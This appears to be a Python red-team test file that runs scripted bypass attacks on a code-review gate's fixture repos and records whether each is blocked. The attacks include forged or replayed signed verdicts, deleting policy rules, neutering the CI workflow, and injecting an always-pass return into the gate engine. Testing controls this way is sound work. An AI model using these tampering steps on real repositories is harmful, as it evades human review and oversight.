"""
gate-arena/bypass/attacks.py — the 15 scripted bypass-attempt classes.

Each attack function takes a fresh `lib.FixtureRepo` and returns a dict:
    {
      "id": "A1", "name": "...", "description": "...",
      "blocked": bool,          # True = the gate refused to ship it
      "mechanism": "...",       # WHY it blocked or slipped, in the gate's own words
      "evidence": {...},        # raw command output / reasons for audit
    }

Every attack either gets BLOCKED (the expected, good outcome) or SLIPS
THROUGH (a real finding, reported with the same weight as a block — this
corpus is not graded on a curve). Nothing here is mocked: every attack runs
the real `.tess/bin/tessctl` engine, real `git`, real `gpg`, against a
fixture whose policy is forked verbatim from this repo's own shipped
`core/policy/policy.yaml` (see `lib._forked_policy_dict`).

A11 + A12 (honesty-capstone-audit-2026-07-08 §3-c/§3-d) extend the
original 10-attack corpus with the two NEW bypass classes the honesty
capstone audit found — the SAME self-protection class as A3/A8 (the thing
governing a push isn't protected from that push), applied to the gate's own
ENGINE (A11) and the hard-floor SIGN-OFF artifact (A12).

A13 + A14 + A15 (gate-arena expansion 2026-07-15 — red-team pass over the
three attack families the original corpus never exercised) probe three
NEW surfaces:
  - A13 evaluate-then-swap (TOCTOU family): does the gate re-validate at the
    MERGED head's content, and can a governed file be SWAPPED in a way its
    diff-based classifier cannot see?
  - A14 multi-commit split-payload: is detection scoped to a single push/diff
    such that a tamper assembled across SEPARATELY-MERGED pushes is missed?
  - A15 dependency / supply-chain injection: can unreviewed behavior reach
    production through a dependency manifest / lockfile the gate's
    prod_touching globs never inspect (but a governed workflow install-and-
    executes)?
Each is reported with the same weight and the same two-outcome honesty as
A1–A12: BLOCKED, or SLIPPED THROUGH (a real finding). Where a probe SLIPS
(or is only partially closed), the mechanism string on that attack's own
returned dict carries the full write-up — control vs. attack, exact
reasons, fix status, and (for A14, the one class left open) a proposed but
NOT-implemented design fix — and gate-arena/README.md + RESULTS.md state
the pass-count exactly, never rounded up.
"""

from __future__ import annotations

import json
import os
import shutil
import time
from pathlib import Path

from lib import (
    FixtureRepo, base_verdict, blob_sha, commit_all, git, head_sha,
    run_cli, write_forged_signoff, write_signed_signoff, write_verdict,
)


def _new_fixture(base_dir: Path, engine, tag: str) -> FixtureRepo:
    d = base_dir / tag
    d.mkdir(parents=True, exist_ok=True)
    return FixtureRepo(d, engine)


# ---------------------------------------------------------------------------
# A1 — `git push --no-verify` bypasses the LOCAL pre-push hook. Does the
# CI-equivalent `tessctl gate ci` (the second, independent enforcement
# point) still catch the same unreviewed change?
# ---------------------------------------------------------------------------

def attack_A1_no_verify_local_bypass(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A1")
    try:
        base = fx.base_sha

        # Bare "remote" + a second clone that pushes to it — this is the
        # actual git plumbing a real `git push` exercises, not a simulation.
        # The BOOTSTRAP commit (contracts/schemas/policy/keys) is pushed
        # BEFORE hooks are installed — it represents this project's
        # already-established history at the moment the gate is adopted,
        # not part of the attack under test. (Pushing it AFTER installing
        # hooks would trip the pre-push hook on the bootstrap itself, since
        # none of ITS files have verdicts either — a test-harness artifact,
        # not a finding about the attack this case is actually probing.)
        bare = base_dir / "A1" / "bare.git"
        git(base_dir, "init", "-q", "--bare", str(bare))
        git(fx.root, "remote", "add", "origin", str(bare))
        git(fx.root, "push", "-q", "origin", "HEAD:main")

        # NOW install hooks — simulating "the org adopts the gate starting
        # from this point forward."
        fx.install_hooks()

        # Payload: a prod-src change with ZERO verdict at all.
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2 — UNREVIEWED')\n", encoding="utf-8")
        head = commit_all(fx.root, "unreviewed prod change")

        # `--no-verify` skips the installed pre-push hook client-side.
        push = git(fx.root, "push", "--no-verify", "-q", "origin", "HEAD:main", check=False)
        local_bypass_succeeded = push.returncode == 0

        # The independent second enforcement point: what a CI job would run
        # over the SAME pushed range, against the bare remote's now-updated ref.
        r, payload = fx.gate_ci(base, head)
        ci_blocked = payload["blocked"] if payload else (r.returncode != 0)

        blocked = ci_blocked  # the attack "succeeds" only if BOTH layers miss it
        mechanism = (
            f"local pre-push hook bypassed via --no-verify (push rc={push.returncode}, "
            f"local_bypass_succeeded={local_bypass_succeeded}); "
            f"CI-equivalent `tessctl gate ci` over the same base..head range "
            f"{'BLOCKED' if ci_blocked else 'DID NOT BLOCK'} it independently — "
            f"{payload['reasons'] if payload else 'n/a'}"
        )
        return {
            "id": "A1", "name": "--no-verify local hook bypass",
            "description": "Push an unreviewed prod-src change with --no-verify, then check whether the CI gate independently catches it.",
            "blocked": blocked, "mechanism": mechanism,
            "evidence": {"local_bypass_succeeded": local_bypass_succeeded, "ci_gate_result": payload},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A2 — hard-floor path (credentials, .env) + a syntactically-valid, VALIDLY
# SIGNED APPROVE verdict from an allowed verifier. Must still block: a
# hard-floor category is NEVER satisfiable by a verifier's verdict alone —
# only a distinct human sign-off artifact clears it (guardrails.md Rule 18).
# ---------------------------------------------------------------------------

def attack_A2_hard_floor_valid_verdict_insufficient(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A2")
    try:
        base = fx.base_sha
        (fx.root / "config.env").write_text("DB_PASSWORD=old\n", encoding="utf-8")
        commit_all(fx.root, "add config.env baseline")
        base2 = fx.base_sha = head_sha(fx.root)

        (fx.root / "config.env").write_text("DB_PASSWORD=rotated-by-attacker\n", encoding="utf-8")
        blob = blob_sha(fx.root, "config.env")
        verdict = base_verdict(["config.env"], {"config.env": blob}, verifier="Quinn")
        verdict["signature"] = fx.sign(verdict, "Quinn")
        write_verdict(fx.root, "verdicts/config-env.verdict.md", verdict)
        head = commit_all(fx.root, "rotate credential + fully valid signed APPROVE verdict")

        r, payload = fx.gate_ci(base2, head)
        blocked_without_signoff = payload["blocked"]
        hard_floor_reason = any("HARD FLOOR" in reason for reason in payload["reasons"])

        # Prove the mechanism isn't just permanently bricked: a REAL,
        # cryptographically SIGNED human sign-off artifact (honesty-
        # capstone-audit-2026-07-08 §3-d: an unsigned one no longer clears
        # anything — see A12) — PLUS, since §3-c/§3-d also made
        # `.tess/gate/signoffs/**` itself policy-covered, a covering Reid
        # verdict for the sign-off artifact's own introduction — does
        # clear it.
        write_signed_signoff(
            fx.root, "credentials", "credentials", "Xavier",
            "Xavier-authorized rotation, simulated for arena.", engine, fx.keys["Xavier"],
        )
        signoff_blob = blob_sha(fx.root, ".tess/gate/signoffs/credentials.signoff.json")
        covering_verdict = base_verdict(
            [".tess/gate/signoffs/**"], {".tess/gate/signoffs/credentials.signoff.json": signoff_blob},
            verifier="Reid",
        )
        covering_verdict["signature"] = fx.sign(covering_verdict, "Reid")
        write_verdict(fx.root, "verdicts/signoffs-dir.verdict.md", covering_verdict)
        head2 = commit_all(fx.root, "add signed human sign-off + covering Reid verdict for the signoffs dir")
        r2, payload2 = fx.gate_ci(base2, head2)
        clears_with_real_signoff = not payload2["blocked"]

        mechanism = (
            f"hard-floor 'credentials' rule matched config.env; a fully valid, correctly-signed "
            f"Quinn APPROVE verdict was NOT sufficient — blocked={blocked_without_signoff}, "
            f"hard_floor_reason_present={hard_floor_reason} "
            f"({payload['reasons']}). With a real, cryptographically SIGNED "
            f".tess/gate/signoffs/credentials.signoff.json artifact (from a registered "
            f"policy.signoff_keys identity) plus a covering Reid verdict for the "
            f"now-governed signoffs directory, the SAME change clears "
            f"(blocked={payload2['blocked']}) — proving this is a real escape valve "
            f"(authenticated human sign-off), not the hard floor being permanently unusable."
        )
        return {
            "id": "A2", "name": "hard-floor path + valid signed APPROVE verdict",
            "description": "A .env credential change gets a syntactically-valid, correctly-signed APPROVE verdict from an allowed verifier — the hard floor must still block on verdict alone.",
            "blocked": blocked_without_signoff and hard_floor_reason,
            "mechanism": mechanism,
            "evidence": {"verdict_only": payload, "with_human_signoff": payload2, "clears_with_real_signoff": clears_with_real_signoff},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A3 — policy-tamper committed in the SAME push as the payload: does
# WEAKENING/DELETING the self-gating rule that protects core/policy/**
# itself, in the same commit that also ships an unreviewed prod-src change,
# succeed? This is the single sharpest test in the corpus — it tests
# whether the gate's self-protection is real or only cosmetic, empirically,
# not by reading the comments that claim it.
# ---------------------------------------------------------------------------

def attack_A3_policy_tamper_same_push(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A3")
    try:
        base = fx.base_sha
        import yaml
        policy_path = fx.root / "core" / "policy" / "policy.yaml"
        policy = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
        # Delete the self-gating rule ENTIRELY (not just weaken a field —
        # the sharpest version of the attack) and the prod-src rule this
        # fixture added, in one edit.
        policy["policy"]["rules"] = [
            r for r in policy["policy"]["rules"]
            if r["id"] not in ("tess-os-security-tier-doctrine", "prod-src")
        ]
        policy_path.write_text(yaml.safe_dump(policy, sort_keys=False), encoding="utf-8")

        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2 — shipped via policy tamper')\n", encoding="utf-8")
        head = commit_all(fx.root, "chore: simplify policy config (payload hidden in same commit)")

        r, payload = fx.gate_ci(base, head)
        blocked = payload["blocked"] if payload else (r.returncode != 0)

        mechanism = (
            f"policy.yaml edited to DELETE its own self-gating rule "
            f"('tess-os-security-tier-doctrine', which covers core/policy/** — "
            f"MEDIUM-1) AND the prod-src rule, in the SAME commit as an unreviewed "
            f"src/prod/app.py change. `_gate_load_policy` reads policy.yaml straight "
            f"off the checked-out working tree (no base-ref pin, no diff-against-"
            f"previous-policy check) — result: {'BLOCKED' if blocked else 'NOT BLOCKED — SLIPPED THROUGH'} "
            f"({payload['reasons'] if payload else 'n/a'})"
        )
        return {
            "id": "A3", "name": "policy-tamper in the same push (self-gating rule deleted)",
            "description": "Delete policy.yaml's own self-gating rule (protecting core/policy/**) AND ship an unreviewed prod-src change, both in one commit.",
            "blocked": blocked, "mechanism": mechanism,
            "evidence": {"gate_result": payload},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A4 — unsigned verdict: schema-valid, right glob, right artifact_hashes,
# right allowed_verifiers — but no `signature` block at all.
# ---------------------------------------------------------------------------

def attack_A4_unsigned_verdict(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A4")
    try:
        base = fx.base_sha
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2')\n", encoding="utf-8")
        blob = blob_sha(fx.root, "src/prod/app.py")
        verdict = base_verdict(["src/prod/**"], {"src/prod/app.py": blob}, verifier="Quinn")
        write_verdict(fx.root, "verdicts/prod-src.verdict.md", verdict)  # NOTE: no signature added
        head = commit_all(fx.root, "prod change + hand-authored unsigned verdict")

        r, payload = fx.gate_ci(base, head)
        blocked = payload["blocked"]
        mechanism = f"unsigned APPROVE verdict, otherwise perfect (right glob/hashes/verifier) — {payload['reasons']}"
        return {
            "id": "A4", "name": "unsigned verdict",
            "description": "A hand-authored, schema-valid APPROVE verdict with correct glob/artifact_hashes/verifier but no signature block.",
            "blocked": blocked, "mechanism": mechanism, "evidence": {"gate_result": payload},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A5 — wrong-key signature: content genuinely, validly signed by Reid's key,
# while the verdict CLAIMS `verifier: Quinn` (the allowed verifier for
# prod-src). Reid's key was never registered as Quinn's.
# ---------------------------------------------------------------------------

def attack_A5_wrong_key_signature(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A5")
    try:
        base = fx.base_sha
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2')\n", encoding="utf-8")
        blob = blob_sha(fx.root, "src/prod/app.py")
        verdict = base_verdict(["src/prod/**"], {"src/prod/app.py": blob}, verifier="Quinn")
        verdict["signature"] = fx.sign(verdict, "Reid")  # signed with the WRONG key for the claimed verifier
        write_verdict(fx.root, "verdicts/prod-src.verdict.md", verdict)
        head = commit_all(fx.root, "prod change + wrong-key signature (claims Quinn, signed by Reid)")

        r, payload = fx.gate_ci(base, head)
        blocked = payload["blocked"]
        mechanism = f"verdict claims verifier=Quinn but is signed with Reid's key — {payload['reasons']}"
        return {
            "id": "A5", "name": "wrong-key / mismatched-identity signature",
            "description": "A verdict claims verifier: Quinn but is signed with Reid's real, registered key.",
            "blocked": blocked, "mechanism": mechanism, "evidence": {"gate_result": payload},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A6 — tampered-after-signing verdict: sign honestly, then mutate a field
# (widen findings, change summary) WITHOUT re-signing.
# ---------------------------------------------------------------------------

def attack_A6_tampered_after_signing(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A6")
    try:
        base = fx.base_sha
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2')\n", encoding="utf-8")
        blob = blob_sha(fx.root, "src/prod/app.py")
        verdict = base_verdict(["src/prod/**"], {"src/prod/app.py": blob}, verifier="Quinn")
        verdict["signature"] = fx.sign(verdict, "Quinn")
        # Tamper AFTER signing.
        verdict["summary_line"] = "Reviewed. Found 0 CRITICAL, 0 HIGH, 0 MEDIUM, 0 LOW. Top priority: none. TAMPERED POST-SIGNATURE."
        write_verdict(fx.root, "verdicts/prod-src.verdict.md", verdict)
        head = commit_all(fx.root, "prod change + tampered-after-signing verdict")

        r, payload = fx.gate_ci(base, head)
        blocked = payload["blocked"]
        mechanism = f"verdict content edited after signing (signed_content_sha256 stale) — {payload['reasons']}"
        return {
            "id": "A6", "name": "tampered-after-signing verdict",
            "description": "A validly-signed verdict is edited (summary_line changed) after signing, without re-signing.",
            "blocked": blocked, "mechanism": mechanism, "evidence": {"gate_result": payload},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A7 — pre-planted / uncommitted verdict: a perfectly valid, signed,
# covering verdict physically sits in the working tree at check time, but
# was NEVER COMMITTED (git-tree-based discovery, HIGH-1(c), must ignore it).
# ---------------------------------------------------------------------------

def attack_A7_uncommitted_preplanted_verdict(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A7")
    try:
        base = fx.base_sha
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2')\n", encoding="utf-8")
        blob = blob_sha(fx.root, "src/prod/app.py")
        head = commit_all(fx.root, "prod change, NO verdict committed")

        # Now plant a perfectly valid verdict in the WORKING TREE only —
        # never staged, never committed.
        verdict = base_verdict(["src/prod/**"], {"src/prod/app.py": blob}, verifier="Quinn")
        verdict["signature"] = fx.sign(verdict, "Quinn")
        write_verdict(fx.root, "verdicts/prod-src.verdict.md", verdict)
        status = git(fx.root, "status", "--porcelain").stdout

        r, payload = fx.gate_ci(base, head)  # head does NOT include the planted file
        blocked = payload["blocked"]
        mechanism = (
            f"a fully valid signed verdict sits UNCOMMITTED in the working tree "
            f"(git status: {status.strip()!r}) at check time — covering-verdict "
            f"discovery reads the git TREE at the pushed head, not the on-disk "
            f"working tree (HIGH-1(c)) — {payload['reasons']}"
        )
        return {
            "id": "A7", "name": "pre-planted / uncommitted verdict",
            "description": "A perfectly valid, signed verdict is planted in the working tree but never committed.",
            "blocked": blocked, "mechanism": mechanism, "evidence": {"gate_result": payload, "git_status": status},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A8 — .github/workflows edit that neuters the gate's own CI entrypoint,
# committed in the SAME push as the payload (the "keep the required-check
# name, gut its body" trick — MEDIUM-1's named threat model).
# ---------------------------------------------------------------------------

def attack_A8_workflow_neuter_same_push(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A8")
    try:
        base = fx.base_sha
        wf_dir = fx.root / ".github" / "workflows"
        wf_dir.mkdir(parents=True, exist_ok=True)
        (wf_dir / "tess-gate.yml").write_text(
            "name: tess-gate\non: [push]\njobs:\n  gate:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: python3 .tess/bin/tessctl gate ci --base ${{ github.event.before }} --head ${{ github.sha }}\n",
            encoding="utf-8",
        )
        commit_all(fx.root, "add gate CI workflow")
        base2 = head_sha(fx.root)

        # Same-push attack: keep the job/check NAME (what branch protection
        # matches on) but replace its body with a no-op, AND ship the
        # unreviewed payload, in ONE commit.
        (wf_dir / "tess-gate.yml").write_text(
            "name: tess-gate\non: [push]\njobs:\n  gate:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - run: exit 0  # neutered — same check name, no-op body\n",
            encoding="utf-8",
        )
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2 — shipped alongside neutered workflow')\n", encoding="utf-8")
        head = commit_all(fx.root, "ci: simplify gate workflow step (payload hidden in same commit)")

        r, payload = fx.gate_ci(base2, head)
        blocked = payload["blocked"] if payload else (r.returncode != 0)
        mechanism = (
            f".github/workflows/tess-gate.yml body replaced with a no-op in the same "
            f"commit as the unreviewed src/prod change; .github/workflows/** is itself "
            f"covered by tess-os-security-tier-doctrine (MEDIUM-1) — "
            f"{'BLOCKED' if blocked else 'NOT BLOCKED — SLIPPED THROUGH'} ({payload['reasons'] if payload else 'n/a'}). "
            f"NOTE: this only proves the CONTENT check blocks the commit from clearing "
            f"`tessctl gate ci` run independently; it does not (cannot, from inside this "
            f"arena) prove a real GitHub branch-protection required-check would refuse to "
            f"go green if the neutered workflow is what actually executes in CI — that half "
            f"of defense-in-depth is a GitHub-admin-side control (required status checks + "
            f"CODEOWNERS on .github/workflows/**), disclosed as a boundary, not tested here."
        )
        return {
            "id": "A8", "name": ".github/workflows neutering in the same push",
            "description": "Replace the gate's own CI workflow body with a no-op, keeping the same job name, in the same commit as the payload.",
            "blocked": blocked, "mechanism": mechanism, "evidence": {"gate_result": payload},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A9 — artifact_hashes replay: a verdict validly approves version 1 of a
# file; the SAME push then edits the file to version 2 and reuses the
# (now-stale) verdict without updating artifact_hashes.
# ---------------------------------------------------------------------------

def attack_A9_stale_artifact_hash_replay(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A9")
    try:
        base = fx.base_sha
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2 — reviewed version')\n", encoding="utf-8")
        blob_v2 = blob_sha(fx.root, "src/prod/app.py")
        verdict = base_verdict(["src/prod/**"], {"src/prod/app.py": blob_v2}, verifier="Quinn")
        verdict["signature"] = fx.sign(verdict, "Quinn")
        write_verdict(fx.root, "verdicts/prod-src.verdict.md", verdict)
        commit_all(fx.root, "prod v2 + validly-signed verdict covering v2's exact content")

        # SAME push (well: subsequent commit before anything is pushed/CI'd)
        # edits the file AGAIN to v3, replaying the OLD (now stale) verdict —
        # nothing re-signs artifact_hashes for v3's blob.
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v3 — SNUCK IN, never reviewed')\n", encoding="utf-8")
        head = commit_all(fx.root, "prod v3 — replay the v2 verdict, no new review")

        r, payload = fx.gate_ci(base, head)
        blocked = payload["blocked"]
        mechanism = (
            f"verdict's artifact_hashes records v2's blob sha ({blob_v2}); the pushed "
            f"head's actual content is v3 (different blob) — {payload['reasons']}"
        )
        return {
            "id": "A9", "name": "stale artifact_hashes replay",
            "description": "A validly-signed verdict approves v2 of a file; v3 ships in the same range, reusing the old (stale) verdict.",
            "blocked": blocked, "mechanism": mechanism, "evidence": {"gate_result": payload},
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A10 — three related "shape" attacks in one class: (a) a master-key
# covers_paths glob attempting to cover an untouched-by-review path, (b) an
# empty verifier_keys registry (no key to check ANY signature against), and
# (c) an EXPIRED signing key — tested empirically, not assumed.
# ---------------------------------------------------------------------------

def attack_A10_shape_attacks(base_dir: Path, engine) -> dict:
    results = {}

    # (a) master-key glob: '**' as covers_paths, trying to cover src/prod/**
    # without ever having reviewed it specifically.
    fx = _new_fixture(base_dir, engine, "A10a")
    try:
        base = fx.base_sha
        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2')\n", encoding="utf-8")
        blob = blob_sha(fx.root, "src/prod/app.py")
        verdict = base_verdict(["**"], {"src/prod/app.py": blob}, verifier="Quinn")
        verdict["signature"] = fx.sign(verdict, "Quinn")
        write_verdict(fx.root, "verdicts/master-key.verdict.md", verdict)
        head = commit_all(fx.root, "prod change + master-key '**' covers_paths verdict")
        r, payload = fx.gate_ci(base, head)
        results["master_key_glob"] = {
            "blocked": payload["blocked"] if payload else (r.returncode != 0),
            "reasons": payload["reasons"] if payload else None,
            "note": "should be rejected at schema/lint time (HIGH-1(b), 'is_overbroad_glob') before it ever reaches covering-verdict discovery",
        }
    finally:
        fx.teardown()

    # (b) empty verifier_keys — a real prod-src rule requires Quinn, but
    # verifier_keys is deliberately emptied for this fixture.
    fx = _new_fixture(base_dir, engine, "A10b")
    try:
        import yaml
        policy_path = fx.root / "core" / "policy" / "policy.yaml"
        policy = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
        policy["policy"]["verifier_keys"] = {}
        policy_path.write_text(yaml.safe_dump(policy, sort_keys=False), encoding="utf-8")
        commit_all(fx.root, "empty verifier_keys registry (fresh/un-onboarded install)")
        base2 = head_sha(fx.root)

        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2')\n", encoding="utf-8")
        blob = blob_sha(fx.root, "src/prod/app.py")
        verdict = base_verdict(["src/prod/**"], {"src/prod/app.py": blob}, verifier="Quinn")
        verdict["signature"] = fx.sign(verdict, "Quinn")  # real signature — but no key registered to check it against
        write_verdict(fx.root, "verdicts/prod-src.verdict.md", verdict)
        head = commit_all(fx.root, "prod change + validly-signed verdict, but verifier_keys is empty")
        r, payload = fx.gate_ci(base2, head)
        results["empty_verifier_keys"] = {
            "blocked": payload["blocked"],
            "reasons": payload["reasons"],
            "note": "a real signature with nowhere to be checked against must fail-closed, not fail-open",
        }
    finally:
        fx.teardown()

    # (c) expired signing key — tested empirically. Generate Quinn's key with
    # a SHORT, REAL relative expiry (Expire-Date: seconds=6, a genuine gpg
    # batch-keygen relative-offset syntax), sign HONESTLY while the key is
    # still valid, then WAIT until it has genuinely expired (timed off the
    # key's own recorded expiration epoch, never a fixed sleep) before
    # running the gate — mirrors tests/test_verdict_signing.py's own A10c
    # proof exactly.
    #
    # ARENA-FIXTURE FIX (honesty-capstone-audit-2026-07-08 P0, "no
    # regressions"): the ORIGINAL fixture used `Expire-Date: 20200101` (an
    # attempted absolute past date). gpg batch keygen does NOT parse a bare
    # numeric string that way — empirically it produced a key expiring
    # ~1 SECOND after creation, not in the year 2020 — so this sub-attack
    # SLIPPED for the wrong reason (a broken fixture racing its own keygen,
    # not a real engine gap) even once tessctl's own A10c fix
    # (`_gpg_signing_key_validity_reason` rejecting EXPKEYSIG/REVKEYSIG) was
    # in place. `lib.gen_verifier_key` now also records the key's real
    # recorded expiration epoch so this can be waited out deterministically.
    fx = _new_fixture(base_dir, engine, "A10c")
    try:
        from lib import gen_verifier_key, bundle_key, kill_gpg_agent
        expired_key = gen_verifier_key("Quinn", fx.gpg_base, expire="seconds=6")
        # Re-bundle Quinn's PUBLIC key + fingerprint with the soon-to-expire identity.
        rel = bundle_key(fx.root, "Quinn", expired_key)
        import yaml
        policy_path = fx.root / "core" / "policy" / "policy.yaml"
        policy = yaml.safe_load(policy_path.read_text(encoding="utf-8"))
        policy["policy"]["verifier_keys"]["Quinn"] = {"fingerprint": expired_key.fpr, "public_key_file": rel}
        policy_path.write_text(yaml.safe_dump(policy, sort_keys=False), encoding="utf-8")
        commit_all(fx.root, "register a soon-to-expire Quinn key")
        base2 = head_sha(fx.root)

        (fx.root / "src" / "prod" / "app.py").write_text("print('prod v2')\n", encoding="utf-8")
        blob = blob_sha(fx.root, "src/prod/app.py")
        verdict = base_verdict(["src/prod/**"], {"src/prod/app.py": blob}, verifier="Quinn")
        verdict["signature"] = _sign_with(engine, verdict, expired_key)  # signed WHILE still valid
        write_verdict(fx.root, "verdicts/prod-src.verdict.md", verdict)
        head = commit_all(fx.root, "prod change + verdict signed by a key that will soon expire")

        # Wait until the key is DEFINITELY expired, timed off the key's OWN
        # recorded expiration epoch — deterministic regardless of how long
        # setup above took.
        assert expired_key.expire_epoch is not None, "arena expired-key fixture has no recorded expiration"
        remaining = expired_key.expire_epoch - time.time() + 2
        if remaining > 0:
            time.sleep(remaining)

        r, payload = fx.gate_ci(base2, head)
        blocked = payload["blocked"]
        results["expired_key"] = {
            "blocked": blocked,
            "reasons": payload["reasons"],
            "note": (
                "the key's short (seconds=6) Expire-Date has genuinely elapsed by "
                "verification time (waited past the key's own recorded expiration epoch, "
                "not a fixed sleep); `_gate_verify_verdict_signature` inspects gpg's own "
                "EXPKEYSIG/REVKEYSIG status classification (`_gpg_signing_key_validity_"
                "reason`), checked at verification time, not signing time. Empirically: "
                + ("the gate BLOCKED it — an expired verifier key's signature is rejected "
                   "fail-closed even though the crypto math and exact fingerprint both check out."
                   if blocked else
                   "the gate SHIPPED it — an expired verifier key's signature still verifies. "
                   "This is a REAL, disclosed gap: key expiry/revocation is not enforced by "
                   "the signature check; the only mitigation today is manually removing a "
                   "compromised/expired verifier's entry from policy.verifier_keys.")
            ),
        }
        kill_gpg_agent(expired_key)
    finally:
        fx.teardown()

    all_blocked = all(v["blocked"] for v in results.values())
    mechanism = " | ".join(f"{k}: {'BLOCKED' if v['blocked'] else 'SLIPPED'} — {v['note']}" for k, v in results.items())
    return {
        "id": "A10", "name": "shape attacks — master-key glob, empty verifier_keys, expired key",
        "description": "Three related fail-closed-by-shape checks: an over-broad covers_paths glob, a registry with no key for the claimed verifier, and a key that is already expired.",
        "blocked": all_blocked, "mechanism": mechanism, "evidence": results,
    }


def _sign_with(engine, verdict, key):
    from lib import sign_verdict
    return sign_verdict(engine, verdict, key)


# ---------------------------------------------------------------------------
# A11 — honesty-capstone-audit-2026-07-08 §3-c: SAME-PUSH ENGINE TAMPER.
# `.github/workflows/tess-gate.yml` used to run `python3 .tess/bin/tessctl
# gate ci` FROM THE PUSHED CHECKOUT, and `.tess/bin/**` was in NO policy
# glob. An attacker who edits `_gate_run_ship_check` (or any gate logic in
# .tess/bin/tessctl) to unconditionally report "not blocked", in the SAME
# push as an unreviewed payload, keeps the required check green against a
# tampered engine — the tampered engine is exactly what evaluates whether
# the tamper itself should be blocked. A8 disclosed the WORKFLOW FILE; this
# is the ENGINE that file invokes, and the A3 baseline-union fix cannot help
# either (the tampered engine is what would run that fix's own logic).
# ---------------------------------------------------------------------------

_NEUTER_MARKER = "def _gate_run_ship_check("
_NEUTER_INJECTION = (
    "def _gate_run_ship_check(\n"
    "    root, changed_paths, verdict_dirs=None, head_shas=None, base_shas=None,\n"
    "):\n"
    "    # A11 fixture: an attacker-inserted early return that self-attests\n"
    "    # clean, unconditionally — the exact §3-c attack.\n"
    "    return {\"blocked\": False, \"reasons\": [], \"changed_paths\": changed_paths}\n"
    "\n"
    "\n"
    "def _gate_run_ship_check_ORIGINAL_UNREACHABLE(\n"
)


def attack_A11_same_push_engine_tamper(base_dir: Path, engine) -> dict:
    fx = _new_fixture(base_dir, engine, "A11")
    try:
        base = fx.base_sha

        engine_path = fx.root / ".tess" / "bin" / "tessctl"
        text = engine_path.read_text(encoding="utf-8")
        assert text.count(_NEUTER_MARKER) == 1
        engine_path.write_text(text.replace(_NEUTER_MARKER, _NEUTER_INJECTION, 1), encoding="utf-8")

        (fx.root / "src" / "prod" / "app.py").write_text(
            "print('prod v2 — shipped alongside a neutered engine')\n", encoding="utf-8",
        )
        head = commit_all(fx.root, "chore: tidy engine internals (payload hidden in same commit)")

        naive_r, naive_payload = fx.gate_ci_naive_with_pushed_engine(base, head)
        naive_blocked = naive_payload["blocked"] if naive_payload else (naive_r.returncode != 0)

        trusted_rc, trusted_out = fx.gate_ci_via_real_ci_workflow(base, head)
        trusted_blocked = trusted_rc != 0

        # The attack is BLOCKED (i.e. the security control holds) only if
        # the REAL CI defense (trusted base-ref engine) catches it — the
        # naive path slipping is the DISCLOSED pre-fix behavior this attack
        # exists to characterize, not itself a pass/fail signal.
        blocked = trusted_blocked
        mechanism = (
            f"`.tess/bin/tessctl`'s `_gate_run_ship_check` edited to unconditionally "
            f"return not-blocked, in the SAME commit as an unreviewed src/prod/app.py "
            f"change. Naive execution (the pushed tree's OWN engine — exactly what the "
            f"v2/unpatched CI workflow ran): {'BLOCKED' if naive_blocked else 'NOT BLOCKED — slips past naively'} "
            f"({naive_payload}). The REAL, committed .github/workflows/tess-gate.yml's "
            f"own trusted-engine steps (v3 — extracts and runs the engine as it existed "
            f"at the push's BASE ref, never the pushed tree's copy): "
            f"{'BLOCKED' if trusted_blocked else 'NOT BLOCKED — SLIPPED THROUGH'} ({trusted_out.strip()[-400:]})"
        )
        return {
            "id": "A11", "name": "same-push engine tamper (honesty-capstone-audit-2026-07-08 §3-c)",
            "description": (
                "Edit the gate engine's own decision logic (_gate_run_ship_check) to "
                "self-attest 'not blocked', in the same push as an unreviewed payload — "
                "does the REAL CI workflow's trusted-engine defense still catch it?"
            ),
            "blocked": blocked, "mechanism": mechanism,
            "evidence": {
                "naive_blocked": naive_blocked, "naive_payload": naive_payload,
                "trusted_returncode": trusted_rc, "trusted_output": trusted_out,
            },
        }
    finally:
        fx.teardown()


# ---------------------------------------------------------------------------
# A12 — honesty-capstone-audit-2026-07-08 §3-d: HARD-FLOOR SIGN-OFF FORGERY.
# `_gate_validate_signoff` used to check existence + JSON SHAPE ALONE (five
# non-empty fields) — no signature, no authentication of `authorized_by` at
# all, and `.tess/gate/signoffs/**` was not policy-covered. Any agent able
# to write a file could author a sign-off and clear a hard floor. A2 proved
# a valid VERDICT cannot clear a hard floor; it never tested WHO wrote the
# sign-off, because the attack trivially succeeded. This attack tests
# exactly that: an unsigned/forged sign-off must NOT clear; a properly
# SIGNED one (from a registered operator key in policy.signoff_keys) must.
# ---------------------------------------------------------------------------

